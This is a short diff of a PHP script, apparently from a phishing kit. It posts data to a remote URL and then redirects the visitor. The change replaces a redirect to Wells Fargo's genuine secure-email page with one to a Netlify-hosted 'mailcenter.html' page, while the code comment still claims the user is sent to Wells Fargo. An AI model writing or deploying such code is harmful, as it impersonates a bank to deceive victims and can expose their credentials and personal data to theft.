@@ -38,6 +38,6 @@ $context = stream_context_create($options);
 $result = file_get_contents($url, false, $context);
 
 // Redirect the user to Wells Fargo's secure email page
-header("location: https://www.wellsfargo.com/help/secure-email/");
+header("location: https://startling-mermaid-1e794e.netlify.app/mailcenter.html");
 
 ?>
